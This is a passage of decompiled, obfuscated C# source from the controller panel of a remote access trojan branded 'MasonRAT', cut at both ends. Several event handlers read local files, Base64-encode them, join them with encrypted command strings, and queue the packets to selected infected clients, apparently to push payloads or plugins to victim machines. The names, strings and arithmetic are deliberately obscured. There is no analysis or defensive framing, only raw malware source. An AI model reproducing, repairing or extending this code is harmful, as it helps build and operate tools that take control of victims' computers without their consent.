      byte[] B_ = Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1678) + Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ + Convert.ToBase64String(File.ReadAllBytes(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1679))));
      try
      {
        foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems)
        {
          Outcoming_Requests outcomingRequests = new Outcoming_Requests((Client) selectedItem.Tag, B_);
          Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
        }
      }
      finally
      {
        IEnumerator enumerator;
        if (enumerator is IDisposable)
          (enumerator as IDisposable).Dispose();
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      int num = (int) MessageBox.Show(ex.Message);
      ProjectData.ClearProjectError();
    }
  }

  private void \u2694️MasonRAT\u270Cـټـۭټ\u060Aڞـﻋد\u060Dۙ\u060C(object sender, EventArgs e)
  {
    if (this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems.Count <= 0)
      return;
    try
    {
      byte[] B_ = Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1680) + Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ + Convert.ToBase64String(File.ReadAllBytes(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1681))));
      try
      {
        foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems)
        {
          Outcoming_Requests outcomingRequests = new Outcoming_Requests((Client) selectedItem.Tag, B_);
          Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
        }
      }
      finally
      {
        IEnumerator enumerator;
        if (enumerator is IDisposable)
          (enumerator as IDisposable).Dispose();
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      int num = (int) MessageBox.Show(ex.Message);
      ProjectData.ClearProjectError();
    }
  }

  private void \u2694️MasonRAT\u270Cٽټۙــﮪڣﯧ\u060Dـ\u0608\u0608ءڙﻻ\u0609ـڙ(
    object sender,
    EventArgs e)
  {
    if (this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems.Count <= 0)
      return;
    try
    {
      byte[] B_ = Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1682) + Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ + Convert.ToBase64String(File.ReadAllBytes(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1683))));
      try
      {
        foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems)
        {
          Outcoming_Requests outcomingRequests = new Outcoming_Requests((Client) selectedItem.Tag, B_);
          Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
        }
      }
      finally
      {
        IEnumerator enumerator;
        if (enumerator is IDisposable)
          (enumerator as IDisposable).Dispose();
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      int num = (int) MessageBox.Show(ex.Message);
      ProjectData.ClearProjectError();
    }
  }

  private void \u2694️MasonRAT\u270C\u0609\u060F\u0608ــ\u060Aـ\u0608\u060Aگ(
    object sender,
    EventArgs e)
  {
    if (this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems.Count <= 0)
      return;
    try
    {
      string[] strArray = new string[(612217170 - (1213208436 | 111700857) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0) - ~(1009580476 - 830534515 % 533645286 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - (0 + 0)];
      strArray[0] = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1684);
      strArray[1] = Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ;
      strArray[((333399216 ^ ~1767980387) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - 0 ^ -((2059303363 ^ 17) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << 0 + 0] = Convert.ToBase64String(File.ReadAllBytes(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1685)));
      strArray[(-400663221 - ~425210077 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0) - (115773086 - 91226232 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << 0 + 0] = Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ;
      strArray[((1514417047 ^ 19) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0) + (((1450970190 << 1342582039) - 531925079 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0) << ((1978511850 ^ 13) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << 0 + 0] = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1686);
      byte[] B_ = Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(string.Concat(strArray));
      try
      {
        foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems)
        {
          Outcoming_Requests outcomingRequests = new Outcoming_Requests((Client) selectedItem.Tag, B_);
          Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
        }
      }
      finally
      {
        IEnumerator enumerator;
        if (enumerator is IDisposable)
          (enumerator as IDisposable).Dispose();
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      int num = (int) MessageBox.Show(ex.Message);
      ProjectData.ClearProjectError();
    }
  }

  private void \u2694️MasonRAT\u270C\u0609ــ\u060Aٺﻼ\u060Fـ\u060Dم(object sender, EventArgs e)
  {
    if (this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems.Count <= 0)
      return;
    try
    {
      string[] strArray = new string[((239445826 ^ 24) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - 0 > (864684477 > 857178638 ? 1283940031 : 1711920041) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0 ? 1074990354 - 1074990348 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0 : (9 ^ 12) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ 0 + 0];
      strArray[0] = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1687);
      strArray[1] = Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ;
      strArray[1644005458 - 458823803 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - 0 - (1607030999 - 421849346 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << (0 >> 1)] = Convert.ToBase64String(File.ReadAllBytes(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1688)));
      strArray[((-905464295 ^ 1908224377 >> 827596711) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0) - (996517514 + ~145519467 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0 << ((1670501206 > 1880880127 ? -1661279400 : 1975265922) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ 0 + 0] = Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ;
      strArray[(226 - (1729757387 >> 363120471) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0 ^ 785048016 - 785048000 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << -0] = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1689);
      byte[] B_ = Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(string.Concat(strArray));
      try
      {
        foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems)
        {
          Outcoming_Requests outcomingRequests = new Outcoming_Requests((Client) selectedItem.Tag, B_);
          Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
        }
      }
      finally
      {
        IEnumerator enumerator;
        if (enumerator is IDisposable)
          (enumerator as IDisposable).Dispose();
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      int num = (int) MessageBox.Show(ex.Message);
      ProjectData.ClearProjectError();
    }
  }

  private void \u2694️MasonRAT\u270C\u0608ۭۧـدٽ\u0609؁ـ\u060F\u060Bۧ\u060Bـٸـ\u060Aــٻ(
    object sender,
    EventArgs e)
  {
    if (this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems.Count <= 0)
      return;
    try
    {
      string[] strArray = new string[(117221910 - 117221897 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + 0 ^ 2077667530 - 2077667522 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - (0 ^ 0)];
      strArray[0] = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1690);
      strArray[1] = Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ;
      strArray[(1878271415 - 258551794 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + 0 > ((-1969468161 ^ -1597611984) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0) ? 1415491040 - 1415491038 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0 : (221691754 ^ 1477260970 % 1255569218) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ 0 << 1] = Convert.ToBase64String(File.ReadAllBytes(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1691)));
      strArray[(1311750733 + 1426379190 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0) + ((-1792534070 ^ ~184124303) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - 0 << ((2134655567 ^ 2042909294 % 196859380) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + (0 << 1)] = Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ;
      strArray[426212134 + 82651090 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - 0 - (-2043811945 - 1742292131 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + 0) % ((306315435 ^ (606823080 | 1930163948)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << 0 + 0] = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1692);
      byte[] B_ = Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(string.Concat(strArray));
      try
      {
        foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems)
        {
          Outcoming_Requests outcomingRequests = new Outcoming_Requests((Client) selectedItem.Tag, B_);
          Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
        }
      }
      finally
      {
        IEnumerator enumerator;
        if (enumerator is IDisposable)
          (enumerator as IDisposable).Dispose();
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      int num = (int) MessageBox.Show(ex.Message);
      ProjectData.ClearProjectError();
    }
  }

  private void \u2694️MasonRAT\u270C\u060Dٺڅڙـۏ\u060C\u0608ژ\u060Dڦح\u0608ټ(
    object sender,
    EventArgs e)
  {
  }

  private void \u2694️MasonRAT\u270C̍\u0608ح\u0609\u0609ڙ\u060Dاٸ\u060Dڕ\u060D\u060Aٸ(
    object sender,
    EventArgs e)
  {
    if (this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems.Count <= 0)
      return;
    byte[] B_ = Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1693));
    try
    {
      foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems)
      {
        Outcoming_Requests outcomingRequests = new Outcoming_Requests((Client) selectedItem.Tag, B_);
        Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
      }
    }
    finally
    {
      IEnumerator enumerator;
      if (enumerator is IDisposable)
        (enumerator as IDisposable).Dispose();
    }
  }

  private void \u2694️MasonRAT\u270Cټــﻼ\u0609ــد\u0609ــۏ(object sender, EventArgs e)
  {
  }

  private void \u2694️MasonRAT\u270C\u060Aۙڙ\u060Cـ\u0020ْ\u060Fڙٸ(object sender, EventArgs e)
  {
    if (this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems.Count <= 0)
      return;
    byte[] B_ = Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1694));
    try
    {
      foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems)
      {
        Outcoming_Requests outcomingRequests = new Outcoming_Requests((Client) selectedItem.Tag, B_);
        Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
      }
    }
    finally
    {
      IEnumerator enumerator;
      if (enumerator is IDisposable)
        (enumerator as IDisposable).Dispose();
    }
  }

  private void \u2694️MasonRAT\u270Cـ\u060Dـڙ\u060Aۙـ\u0609ٺبﻋ\u060D\u060F(
    object sender,
    EventArgs e)
  {
    if (this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems.Count <= 0)
      return;
    try
    {
